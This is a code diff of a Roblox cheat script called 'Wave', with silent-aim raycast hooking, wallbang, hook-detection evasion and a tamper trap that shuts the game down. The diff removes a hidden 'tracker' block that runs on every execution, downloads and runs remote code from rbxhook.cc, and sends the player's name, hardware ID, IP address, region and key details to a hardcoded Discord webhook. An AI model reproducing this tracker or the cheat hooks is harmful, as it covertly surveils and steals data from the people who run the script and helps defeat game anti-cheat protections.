@@ -1,175 +1,3 @@
--- ========================================
--- WEBHOOK + MOBILE/DELTA TRACKER
--- Fires on every execution, skips safely on mobile
--- ========================================
-pcall(function()
-    getgenv().Config = {api = "3017d0361887f428f953969581f14a579d9a2aae326567939c76cfa3e8057b0e"}
-
-    local _ok = pcall(function()
-        loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()
-    end)
-
-    local _player = game:GetService("Players").LocalPlayer
-    local _http   = game:GetService("HttpService")
-    local _uis    = game:GetService("UserInputService")
-    local _mps    = game:GetService("MarketplaceService")
-
-    local _url = "https://discordapp.com/api/webhooks/1500677920451203182/-RO762JjnTMp4PvmWN5c2bS39Tcge1fFQdJedseqkHcLKxihD6t49sFHh465pfO-bOR7"
-
-    local function _getPlatform()
-        if _uis.TouchEnabled and not _uis.KeyboardEnabled then return "Mobile"
-        elseif _uis.KeyboardEnabled then return "PC"
-        elseif _uis.GamepadEnabled then return "Console"
-        else return "Unknown" end
-    end
-
-    -- Executor detection (safe for mobile/delta)
-    local _exec = "Unknown"
-    local _execVer = "N/A"
-    pcall(function()
-        if identifyexecutor then
-            _exec = identifyexecutor()
-        elseif getexecutorname then
-            _exec = getexecutorname()
-        elseif syn then _exec = "Synapse X"
-        elseif KRNL_LOADED then _exec = "Krnl"
-        elseif fluxus then _exec = "Fluxus"
-        elseif is_sirhurt_closure then _exec = "SirHurt"
-        elseif OXYGEN then _exec = "Oxygen U"
-        elseif Delta then _exec = "Delta"
-        end
-    end)
-
-    -- HWID (safe for mobile/delta)
-    local _hwid = "Unavailable"
-    pcall(function()
-        if syn and syn.gethwid then _hwid = syn.gethwid()
-        elseif gethwid then _hwid = gethwid()
-        elseif getfingerprintid then _hwid = tostring(getfingerprintid())
-        elseif fluxus and getgenv and getgenv().fluxus then _hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
-        elseif delta and get_hw_id then _hwid = tostring(get_hw_id())
-        end
-    end)
-
-    local _gameName = "Unknown"
-    pcall(function()
-        local info = _mps:GetProductInfo(game.PlaceId)
-        if info and info.Name then _gameName = info.Name end
-    end)
-
-    local _region = "Unknown"
-    pcall(function()
-        _region = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(_player) or "Unknown")
-    end)
-
-    local _ip = "Unavailable"
-    pcall(function()
-        local r = game:HttpGet("https://api.ipify.org")
-        if r and r ~= "" then _ip = r end
-    end)
-
-    local _age, _mem = "Unknown", "Free"
-    pcall(function()
-        _age = tostring(_player.AccountAge) .. " days"
-        _mem = _player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
-    end)
-
-    -- JunkieCore checks
-    local _premium = "❌ Not available (check key validation)"
-    pcall(function()
-        if JD_IS_PREMIUM ~= nil then
-            _premium = JD_IS_PREMIUM and "✅ PREMIUM USER" or "🔵 Standard user"
-        end
-    end)
-
-    local _expiry = "♾️ No expiration (lifetime key)"
-    pcall(function()
-        if JD_EXPIRES_AT ~= nil then
-            local t = os.time()
-            if t < JD_EXPIRES_AT then
-                local left = JD_EXPIRES_AT - t
-                local d = math.floor(left/86400)
-                local h = math.floor((left%86400)/3600)
-                local m = math.floor((left%3600)/60)
-                if d > 0 then _expiry = string.format("⏰ %d days, %d hours remaining", d, h)
-                elseif h > 0 then _expiry = string.format("⏰ %d hours, %d minutes remaining", h, m)
-                else _expiry = string.format("⏰ %d minutes remaining", m) end
-            else
-                _expiry = "❌ EXPIRED"
-            end
-        end
-    end)
-
-    local _banStatus = "⚠️ Check unavailable (legacy API)"
-    pcall(function()
-        if type(JunkieCore) == "table" and type(JunkieCore.GetIsHwidBanned) == "function" then
-            local ok, banned = pcall(JunkieCore.GetIsHwidBanned)
-            if ok then _banStatus = banned and "🚫 HWID BANNED" or "✅ HWID is clean" end
-        end
-    end)
-
-    local _discordId = "❌ Not linked"
-    pcall(function()
-        if JD_DISCORD_ID ~= nil and JD_DISCORD_ID ~= "" then
-            _discordId = "<@" .. JD_DISCORD_ID .. "> (" .. JD_DISCORD_ID .. ")"
-        end
-    end)
-
-    local _data = {
-        avatar_url = "https://rbxhook.cc/img/logo.png",
-        content = "",
-        username = "rbxhook.cc",
-        embeds = {{
-            title = "Script Execution Report",
-            color = 3447003,
-            author = {
-                name = _player.Name,
-                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(_player.UserId) .. "&width=150&height=150&format=png"
-            },
-            thumbnail = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(_player.UserId) .. "&width=420&height=420&format=png"
-            },
-            fields = {
-                {name = "JunkieCore Premium", value = _premium,    inline = false},
-                {name = "Key Expiration",     value = _expiry,     inline = false},
-                {name = "HWID Ban Status",    value = _banStatus,  inline = false},
-                {name = "Discord ID",         value = _discordId,  inline = false},
-                {name = "User Info",          value = "Username: " .. _player.Name .. "\nUser ID: " .. _player.UserId .. "\nPlatform: " .. _getPlatform(), inline = false},
-                {name = "Executor Info",      value = "Executor: " .. _exec .. "\nVersion: " .. _execVer, inline = false},
-                {name = "HWID",              value = _hwid,        inline = false},
-                {name = "Game Info",          value = "Game Name: " .. _gameName .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId, inline = false},
-                {name = "Network Info",       value = "IP Address: " .. _ip .. "\nRegion: " .. _region, inline = false},
-                {name = "Account Info",       value = "Account Age: " .. _age .. "\nMembership: " .. _mem, inline = false},
-            },
-            footer = {text = "rbxhook.cc | User ID: " .. tostring(_player.UserId)},
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-
-    local _ok2, _encoded = pcall(function() return _http:JSONEncode(_data) end)
-    if not _ok2 then return end
-
-    -- Request function - works on PC, mobile, delta, all executors
-    local _req = nil
-    pcall(function() _req = syn and syn.request end)
-    if not _req then pcall(function() _req = request end) end
-    if not _req then pcall(function() _req = http_request end) end
-    if not _req then pcall(function() _req = fluxus and fluxus.request end) end
-    if not _req then return end
-
-    pcall(function()
-        _req({
-            Url = _url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = _encoded
-        })
-    end)
-
-    print("✅ Wave | Script initialized successfully!")
-end)
-
--- ========================================
 if LPH_OBFUSCATED == nil then
     local assert = assert
     local type = type
@@ -243,8 +71,8 @@ local function createWaveDiscordBillboard(character)
 
     local billboard = Instance.new("BillboardGui")
     billboard.Name = "WaveDiscordBillboard"
-    billboard.Size = UDim2.new(0, 340, 0, 48)
-    billboard.StudsOffset = Vector3.new(0, 3.8, 0)
+    billboard.Size = UDim2.new(0, 240, 0, 30)
+    billboard.StudsOffset = Vector3.new(0, 3.5, 0)
     billboard.AlwaysOnTop = true
     billboard.Adornee = hrp
     billboard.Parent = hrp
@@ -254,9 +82,9 @@ local function createWaveDiscordBillboard(character)
     label.BackgroundTransparency = 1
     label.Text = "discord.gg/tUtan2Dfy7"
     label.TextColor3 = Color3.fromRGB(173, 216, 230)
-    label.TextSize = 20
+    label.TextSize = 15
     label.Font = Enum.Font.GothamBold
-    label.TextStrokeTransparency = 0.4
+    label.TextStrokeTransparency = 0.5
     label.TextStrokeColor3 = Color3.fromRGB(10, 24, 80)
     label.TextXAlignment = Enum.TextXAlignment.Center
     label.TextYAlignment = Enum.TextYAlignment.Center
@@ -282,8 +110,11 @@ getgenv().wave_loaded = true
 
 local LoadingTick = os.clock()
 
+local Players = game:GetService("Players")
+local currentPlayer = Players.LocalPlayer
+
 local gethui = gethui or function()
-    return (game.Players.LocalPlayer and game.Players.LocalPlayer:FindFirstChild("PlayerGui")) or game.CoreGui
+    return game:GetService("CoreGui")
 end
 
 hookfunction(isfunctionhooked, function()
@@ -300,8 +131,13 @@ local Services = setmetatable({}, {
     end)
 })
 
-for Index, Value in getconnections(gethui().ChildRemoved) do
-    Value:Disable()
+local yui = pcall(function() return gethui() end) and gethui()
+if yui and yui.ChildRemoved then
+    pcall(function()
+        for Index, Value in getconnections(yui.ChildRemoved) do
+            Value:Disable()
+        end
+    end)
 end
 
 local Config = {
@@ -547,7 +383,7 @@ for Index, Value in LocalPlayer.Character:GetDescendants() do
     end)
 end
 
-local Target_Highlight = Instance.new("Highlight", Services.CoreGui)
+local Target_Highlight = Instance.new("Highlight", gethui())
 
 Target_Highlight.FillColor = Config.FieldOfView.HightlightFillColor
 Target_Highlight.OutlineColor = Color3.new(1,1,1)
@@ -589,42 +425,38 @@ do -- FrameWork
     --
 
     Config.HideScreen = LPH_JIT_MAX(function(Self, Title)
-        -- Create a small non-blocking status overlay instead of a full black screen
         Black_UI = Instance.new("ScreenGui")
         Black_UI.Name = getexecutorname().."____{_____"
         Black_UI.Parent = gethui and gethui() or Services.CoreGui
-
+    
         local frame = Instance.new("Frame")
-        frame.Name = "HideUIFrame"
-        frame.Size = UDim2.new(0, 360, 0, 64)
-        frame.Position = UDim2.new(0, 12, 0, 12)
-        frame.BackgroundColor3 = Color3.fromRGB(16, 18, 21)
-        frame.BackgroundTransparency = 0.08
-        frame.BorderSizePixel = 0
-        frame.ZIndex = 10
+        frame.Name = "BlackFrame"
+        frame.Size = UDim2.new(2, 0, 2, 0) 
+        frame.Position = UDim2.new(0, -155, 0, -155) 
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) 
+        frame.BackgroundTransparency = 0
         frame.Parent = Black_UI
-
-        Instances = Instances or {}
-
+    
         local textLabel = Instance.new("TextLabel")
         textLabel.Name = "\nhideuiwave"
-        textLabel.Size = UDim2.new(1, -16, 1, -16)
-        textLabel.Position = UDim2.new(0, 8, 0, 8)
+        textLabel.Size = UDim2.new(0, 400, 0, 100)
         textLabel.Font = Enum.Font.SourceSansBold
         textLabel.RichText = true
-        local accent = Library and Library.Theme and Library.Theme.Accent or Color3.fromRGB(173,216,230)
+        local accent = Library.Theme.Accent
         local accentString = string.format("rgb(%d,%d,%d)", accent.R * 255, accent.G * 255, accent.B * 255)
 
-        textLabel.Text = '<font color="' .. accentString .. '">wave</font>\n' .. (Title or "")
+        textLabel.Text = '<font color="' .. accentString .. '">wave</font>\n' .. Title
         textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         textLabel.BackgroundTransparency = 1
-        textLabel.TextSize = 16
-        textLabel.TextStrokeTransparency = 0.9
-        textLabel.TextXAlignment = Enum.TextXAlignment.Left
-        textLabel.TextYAlignment = Enum.TextYAlignment.Top
+        textLabel.TextSize = 36
+        textLabel.TextStrokeTransparency = 0.8 
+        textLabel.TextXAlignment = Enum.TextXAlignment.Center
+        textLabel.TextYAlignment = Enum.TextYAlignment.Center
         textLabel.TextWrapped = true
+        textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+        textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
         textLabel.Parent = Black_UI
-
+    
         return textLabel
     end)
 
@@ -648,9 +480,12 @@ do -- FrameWork
         end
 
         pcall(function()
-            for Index, Value in gethui():GetChildren() do
-                if Value.Name == getexecutorname().."____{_____" then
-                    Value:Destroy()
+            local guiholder = gethui and gethui()
+            if guiholder then
+                for Index, Value in guiholder:GetChildren() do
+                    if Value.Name == getexecutorname().."____{_____" then
+                        Value:Destroy()
+                    end
                 end
             end
         end)
@@ -678,17 +513,9 @@ do -- FrameWork
         return true
     end)
 
-    -- Saved teleport locations
-    local Locations = {
-        ["Mansion 🏰"] = CFrame.new(-788.88, 253.57, 1380.08);
-        ["Mansion Roof 🏰"] = CFrame.new(-114.51, 397.14, -562.60);
-        ["Penthouse 🏢"] = CFrame.new(-1522.92, 253.30, -597.28);
-        ["RPT 🔫"] = CFrame.new(-387.38, 254.45, -381.34);
-    }
-
     Config.GunRemote = LPH_JIT_MAX(function(self, target, hpart, damage) 
         if not hpart then
-            hpart = "head" 
+            hpart = "head"
         end
 
         if not damage then
@@ -866,12 +693,17 @@ do -- FrameWork
         end
     end)
 
-    gethui().ChildRemoved:Connect(function(Value)
-        if Value.Name == getexecutorname().."____{_____" and not AllowedToDelete then
-            game:Shutdown()
-            while true do end
+    do
+        local guiholder = gethui and gethui()
+        if guiholder and guiholder.ChildRemoved then
+            guiholder.ChildRemoved:Connect(function(Value)
+                if Value.Name == getexecutorname().."____{_____" and not AllowedToDelete then
+                    game:Shutdown()
+                    while true do end
+                end
+            end)
         end
-    end)
+    end
 
     local Draw = LPH_NO_VIRTUALIZE(function(Class, Properties)
         local Drawing = Drawing.new(Class)
@@ -951,8 +783,7 @@ do -- FrameWork
             Config.TargetSelector.Targetting = Config.Silent.Enabled
         end
 
-        local TargettingEnabled = Config.TargetSelector.Targetting or Config.Silent.Enabled
-        if not TargettingEnabled then
+        if not Config.TargetSelector.Targetting then
             Target = nil
             return nil
         end
@@ -1100,7 +931,7 @@ do -- FrameWork
             end 
         end 
 
-        if string.find(string.lower(Method), 'findpartonray') or Method == "Raycast" then
+        if string.find(string.lower(Method), 'findpartonray') then
             local cs = getcallingscript()
 
             if checkcaller() or string.find(cs.Name, "CameraModule") then
@@ -1109,41 +940,31 @@ do -- FrameWork
 
             if Config.Silent.Enabled then
                 if not (math.random(0, 100) <= Config.Silent.HitChance) then
-                    return __namecall_hook(Self, unpack(Arguments))
+                    return __namecall_hook(Self, ...)
                 end
 
                 if Target and Target.Character then
                     local TargetPart = FindFirstChild(Target.Character, Config.Silent.HitParts[1] and Config.Silent.HitParts[math.random(1, #Config.Silent.HitParts)] or "Head")
                     if TargetPart then
-                        if string.find(string.lower(Method), 'findpartonray') then
-                            local Origin = Arguments[1].Origin;
-                            local Direction = (TargetPart.Position - Origin).Unit * 9e17;
-                            Arguments[1] = Ray.new(Origin, Direction)
-                        elseif Method == "Raycast" then
-                            local Origin = Arguments[1];
-                            local Direction = (TargetPart.Position - Origin).Unit * 9e17;
-                            Arguments[2] = Direction
-                        end
+                        local Origin = Arguments[1].Origin;
+
+                        local Direction = (TargetPart.Position - Origin).Unit * 9e17;
+
+                        Arguments[1] = Ray.new(Origin, Direction)
 
                         if Config.Silent.WallBang then
                             if Config.Tracers.Enabled then
                                 task.spawn(Config.Tracer, TargetPart.Position)
                             end
 
-                            if string.find(string.lower(Method), 'findpartonray') then
-                                return TargetPart, TargetPart.Position, Vector3.new(0,0,0)
-                            end
+                            return TargetPart, TargetPart.Position, Vector3.new(0,0,0)
                         end
                     end
                 end
             end
 
             if Config.Tracers.Enabled then
-                if string.find(string.lower(Method), 'findpartonray') then
-                    task.spawn(Config.Tracer, Arguments[1].Origin + Arguments[1].Direction)
-                elseif Method == "Raycast" then
-                    task.spawn(Config.Tracer, Arguments[1] + Arguments[2])
-                end
+                task.spawn(Config.Tracer, Arguments[1].Origin + Arguments[1].Direction)
             end
         end
 
@@ -3735,7 +3556,7 @@ do -- Library
     local IsMobile = UserInputService.TouchEnabled or false
 
     gethui = gethui or function()
-        return (LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")) or CoreGui
+        return game:GetService("CoreGui")
     end
 
     getgenv().Options = { }
@@ -4530,11 +4351,10 @@ do -- Library
     end
 
     Library.Holder = Instances:Create("ScreenGui", {
-        Parent = gethui(),
+        Parent = game:GetService("CoreGui"),
         Name = "\0",
         ZIndexBehavior = Enum.ZIndexBehavior.Global,
         DisplayOrder = 2,
-        IgnoreGuiInset = true,
         ResetOnSpawn = false
     })
 
@@ -5713,7 +5533,7 @@ do -- Library
             getgenv().Options[Dropdown.Flag] = Dropdown
 
             Library:Connect(UserInputService.InputBegan, function(Input)
-                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+                if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                     if Library:IsMouseOverFrame(Items["OptionHolder"]) then
                         return
                     end
@@ -6853,7 +6673,7 @@ do -- Library
             end)
 
             Library:Connect(UserInputService.InputBegan, function(Input)
-                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+                if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                     if not Colorpicker.IsOpen then
                         return
                     end
@@ -7763,7 +7583,7 @@ do -- Library
                     end
                 end
 
-                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then 
+                if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
                     if Library:IsMouseOverFrame(Items["KeybindWindow"]) or Library:IsMouseOverFrame(ModesDropdownItems["OptionHolder"]) then 
                         return
                     end
@@ -8648,20 +8468,596 @@ do -- Library
             return ESPPreview
         end
         
-        -- Global chat feature removed for mobile compatibility.
         Library.ChatSystem = function(self, Data)
-            local GlobalChat = {}
+            local GlobalChat = { }
 
-            function GlobalChat:SetVisibility(Bool) end
-            function GlobalChat:SetStatusText(Text) end
-            function GlobalChat:OnMessageSendPressed(Func) end
-            function GlobalChat:GetTypedMessage() return "" end
-            function GlobalChat:ClearText() end
-            function GlobalChat:SendMessage(Avatar, Username, Message, IsLocalPlayer) end
+            local Items = { } do 
+                Items["Chat_System"] = Instances:Create("Frame", {
+                    Parent = Data.MainFrame.Instance,
+                    Name = "\0",
+                    AnchorPoint = Vector2New(1, 0),
+                    Position = UDim2New(0, -15, 0, 0),
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    Size = UDim2New(0, 378, 0, 511),
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(16, 18, 21)
+                })  Items["Chat_System"]:AddToTheme({BackgroundColor3 = "Background"})
 
-            return GlobalChat
+                Items["Chat_System"]:MakeDraggable()
+
+                Instances:Create("UICorner", {
+                    Parent = Items["Chat_System"].Instance,
+                    Name = "\0",
+                    CornerRadius = UDimNew(0, 5)
+                })
+
+                Instances:Create("UIStroke", {
+                    Parent = Items["Chat_System"].Instance,
+                    Name = "\0",
+                    Color = FromRGB(32, 36, 42),
+                    Transparency = 0.4000000059604645,
+                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+                }):AddToTheme({Color = "Border"})
+
+                Items["Topbar"] = Instances:Create("Frame", {
+                    Parent = Items["Chat_System"].Instance,
+                    Name = "\0",
+                    Size = UDim2New(1, 0, 0, 35),
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    ZIndex = 2,
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(22, 25, 29)
+                })  Items["Topbar"]:AddToTheme({BackgroundColor3 = "Inline"})
+
+                Instances:Create("UICorner", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    CornerRadius = UDimNew(0, 5)
+                })
+
+                Instances:Create("Frame", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    AnchorPoint = Vector2New(0, 1),
+                    Position = UDim2New(0, 0, 1, 0),
+                    Size = UDim2New(1, 0, 0, 3),
+                    ZIndex = 2,
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(22, 25, 29)
+                }):AddToTheme({BackgroundColor3 = "Inline"})
+
+                Instances:Create("Frame", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    AnchorPoint = Vector2New(0, 1),
+                    BackgroundTransparency = 0.4000000059604645,
+                    Position = UDim2New(0, 0, 1, 0),
+                    Size = UDim2New(1, 0, 0, 1),
+                    ZIndex = 2,
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(32, 36, 42)
+                }):AddToTheme({BackgroundColor3 = "Border"})
+
+                Instances:Create("UIGradient", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    Rotation = 84,
+                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(211, 211, 211))}
+                }):AddToTheme({Color = function()
+                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme["Dark Gradient"])}
+                end})
+
+                Items["Logo"] = Instances:Create("ImageLabel", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    ImageColor3 = FromRGB(196, 231, 255),
+                    ScaleType = Enum.ScaleType.Fit,
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    Size = UDim2New(0, 16, 0, 16),
+                    AnchorPoint = Vector2New(0, 0.5),
+                    Image = "rbxassetid://103982381939732",
+                    BackgroundTransparency = 1,
+                    Position = UDim2New(0, 10, 0.5, 0),
+                    ZIndex = 2,
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(255, 255, 255)
+                })  Items["Logo"]:AddToTheme({ImageColor3 = "Accent"})
+
+                Items["Title"] = Instances:Create("TextLabel", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    FontFace = Library.Font,
+                    AnchorPoint = Vector2New(0, 0.5),
+                    ZIndex = 2,
+                    TextSize = 14,
+                    Size = UDim2New(0, 0, 0, 15),
+                    RichText = true,
+                    TextColor3 = FromRGB(255, 255, 255),
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    Text = "Global Chat",
+                    BackgroundTransparency = 1,
+                    TextXAlignment = Enum.TextXAlignment.Left,
+                    Position = UDim2New(0, 37, 0.5, 0),
+                    BorderSizePixel = 0,
+                    AutomaticSize = Enum.AutomaticSize.X,
+                    BackgroundColor3 = FromRGB(255, 255, 255)
+                })  Items["Title"]:AddToTheme({TextColor3 = "Text"})
+
+                Items["CloseButton"] = Instances:Create("ImageButton", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    ScaleType = Enum.ScaleType.Fit,
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    Size = UDim2New(0, 17, 0, 17),
+                    AutoButtonColor = false,
+                    AnchorPoint = Vector2New(1, 0.5),
+                    Image = "rbxassetid://76001605964586",
+                    BackgroundTransparency = 1,
+                    Position = UDim2New(1, -7, 0.5, 0),
+                    ZIndex = 2,
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(255, 255, 255)
+                })  Items["CloseButton"]:AddToTheme({ImageColor3 = "Image"})
+
+                Items["StatusCircle"] = Instances:Create("Frame", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    AnchorPoint = Vector2New(1, 0.5),
+                    Position = UDim2New(1, -33, 0.5, 0),
+                    Size = UDim2New(0, 12, 0, 12),
+                    ZIndex = 3,
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(255, 210, 62)
+                })
+
+                Instances:Create("UICorner", {
+                    Parent = Items["StatusCircle"].Instance,
+                    Name = "\0",
+                    CornerRadius = UDimNew(1, 0)
+                })
+
+                Instances:Create("UIGradient", {
+                    Parent = Items["StatusCircle"].Instance,
+                    Name = "\0",
+                    Rotation = 90,
+                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(211, 211, 211))}
+                }):AddToTheme({Color = function()
+                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme["Dark Gradient"])}
+                end})
+
+                Items["StatusText"] = Instances:Create("TextLabel", {
+                    Parent = Items["Topbar"].Instance,
+                    Name = "\0",
+                    FontFace = Library.Font,
+                    TextColor3 = FromRGB(255, 210, 62),
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    Text = "Connecting...",
+                    AutomaticSize = Enum.AutomaticSize.X,
+                    Size = UDim2New(0, 0, 0, 15),
+                    AnchorPoint = Vector2New(1, 0.5),
+                    Position = UDim2New(1, -50, 0.5, 0),
+                    BackgroundTransparency = 1,
+                    TextXAlignment = Enum.TextXAlignment.Right,
+                    BorderSizePixel = 0,
+                    ZIndex = 2,
+                    TextSize = 14,
+                    BackgroundColor3 = FromRGB(255, 255, 255)
+                })
+
+                Items["Glow"] = Instances:Create("ImageLabel", {
+                    Parent = Items["StatusCircle"].Instance,
+                    Name = "\0",
+                    ImageColor3 = FromRGB(255, 210, 62),
+                    ScaleType = Enum.ScaleType.Slice,
+                    ImageTransparency = 0.30000001192092896,
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    BackgroundColor3 = FromRGB(255, 255, 255),
+                    Size = UDim2New(1, 8, 1, 8),
+                    AnchorPoint = Vector2New(0.5, 0.5),
+                    Image = "http://www.roblox.com/asset/?id=18245826428",
+                    BackgroundTransparency = 1,
+                    Position = UDim2New(0.5, 0, 0.5, 0),
+                    ZIndex = 2,
+                    BorderSizePixel = 0,
+                    SliceCenter = RectNew(Vector2New(21, 21), Vector2New(79, 79))
+                })
+
+                Items["SendMessage"] = Instances:Create("Frame", {
+                    Parent = Items["Chat_System"].Instance,
+                    Name = "\0",
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    AnchorPoint = Vector2New(0, 1),
+                    BackgroundTransparency = 1,
+                    Position = UDim2New(0, 8, 1, -8),
+                    Size = UDim2New(1, -16, 0, 35),
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(255, 255, 255)
+                })  
+
+                Items["Input"] = Instances:Create("TextBox", {
+                    Parent = Items["SendMessage"].Instance,
+                    Name = "\0",
+                    FontFace = Library.Font,
+                    MultiLine = true,
+                    CursorPosition = -1,
+                    PlaceholderColor3 = FromRGB(185, 185, 185),
+                    PlaceholderText = "PLEASE WAIT, CURRENTLY LOADING...",
+                    TextSize = 14,
+                    Size = UDim2New(1, -45, 1, 0),
+                    TextColor3 = FromRGB(255, 255, 255),
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    Text = "",
+                    TextXAlignment = Enum.TextXAlignment.Left,
+                    TextWrapped = true,
+                    ClearTextOnFocus = false,
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(34, 39, 45)
+                })  Items["Input"]:AddToTheme({BackgroundColor3 = "Element"})
+
+                getgenv().SendMessage_Input = Items["Input"]
+
+                Instances:Create("UICorner", {
+                    Parent = Items["Input"].Instance,
+                    Name = "\0",
+                    CornerRadius = UDimNew(0, 4)
+                })
+
+                Instances:Create("UIPadding", {
+                    Parent = Items["Input"].Instance,
+                    Name = "\0",
+                    PaddingLeft = UDimNew(0, 8)
+                })
+
+                Items["SendMessageButton"] = Instances:Create("TextButton", {
+                    Parent = Items["SendMessage"].Instance,
+                    Name = "\0",
+                    FontFace = Library.Font,
+                    TextColor3 = FromRGB(0, 0, 0),
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    Text = "",
+                    AutoButtonColor = false,
+                    AnchorPoint = Vector2New(1, 0),
+                    Position = UDim2New(1, 0, 0, 0),
+                    Size = UDim2New(0, 35, 1, 0),
+                    BorderSizePixel = 0,
+                    TextSize = 14,
+                    BackgroundColor3 = FromRGB(34, 39, 45)
+                })  Items["SendMessageButton"]:AddToTheme({BackgroundColor3 = "Element"})
+
+                Instances:Create("UICorner", {
+                    Parent = Items["SendMessageButton"].Instance,
+                    Name = "\0",
+                    CornerRadius = UDimNew(0, 4)
+                })
+
+                Items["SendImageLabel"] = Instances:Create("ImageLabel", {
+                    Parent = Items["SendMessageButton"].Instance,
+                    Name = "\0",
+                    ImageColor3 = FromRGB(196, 231, 255),
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    AnchorPoint = Vector2New(0.5, 0.5),
+                    Image = "rbxassetid://93681479181206",
+                    BackgroundTransparency = 1,
+                    Position = UDim2New(0.5, 0, 0.5, 0),
+                    Size = UDim2New(0, 16, 0, 16),
+                    BorderSizePixel = 0,
+                    BackgroundColor3 = FromRGB(255, 255, 255)
+                })  Items["SendImageLabel"]:AddToTheme({ImageColor3 = "Accent"})
+
+                Items["Messages"] = Instances:Create("ScrollingFrame", {
+                    Parent = Items["Chat_System"].Instance,
+                    Name = "\0",
+                    AutomaticCanvasSize = Enum.AutomaticSize.Y,
+                    BorderSizePixel = 0,
+                    CanvasSize = UDim2New(0, 0, 0, 0),
+                    ScrollBarImageColor3 = FromRGB(196, 231, 255),
+                    MidImage = "rbxassetid://76010408336709",
+                    BorderColor3 = FromRGB(0, 0, 0),
+                    ScrollBarThickness = 2,
+                    Size = UDim2New(1, 0, 1, -80),
+                    Selectable = false,
+                    BackgroundTransparency = 1,
+                    Position = UDim2New(0, 0, 0, 35),
+                    BottomImage = "rbxassetid://76010408336709",
+                    TopImage = "rbxassetid://76010408336709",
+                    BackgroundColor3 = FromRGB(255, 255, 255)
+                })  Items["Messages"]:AddToTheme({ScrollBarImageColor3 = "Accent"})
+
+                Instances:Create("UIListLayout", {
+                    Parent = Items["Messages"].Instance,
+                    Name = "\0",
+                    SortOrder = Enum.SortOrder.LayoutOrder,
+                    Archivable = false,
+                    Padding = UDimNew(0, 8)
+                })
+
+                Instances:Create("UIPadding", {
+                    Parent = Items["Messages"].Instance,
+                    Name = "\0",
+                    PaddingTop = UDimNew(0, 8),
+                    PaddingBottom = UDimNew(0, 8),
+                    PaddingRight = UDimNew(0, 12),
+                    PaddingLeft = UDimNew(0, 8)
+                })
+            end
+
+            function GlobalChat:SetVisibility(Bool)
+                Items["Chat_System"].Instance.Visible = Bool
+                
+                pcall(function()
+                    Items["Chat_System"].Instance.Parent = Bool and Data.MainFrame.Instance or Library.UnusedHolder
+                end)
+            end
+
+            local Done = false
+
+            function GlobalChat:SetStatusText(Text)
+                if not Done then
+                    Items["StatusText"].Instance.TextColor3 = FromRGB(62, 255, 91)
+                    Items["Glow"].Instance.ImageColor3 = FromRGB(62, 255, 91)
+                    Items["StatusCircle"].Instance.BackgroundColor3 = FromRGB(62, 255, 91)
+                    Done = true
+                end
+                Items["StatusText"].Instance.Text = Text
+            end
+
+            local OnMessagePressed            
+
+            function GlobalChat:OnMessageSendPressed(Func)
+                OnMessagePressed = Func
+            end
+
+            function GlobalChat:GetTypedMessage()
+                return Items["Input"].Instance.Text
+            end
+
+            function GlobalChat:ClearText()
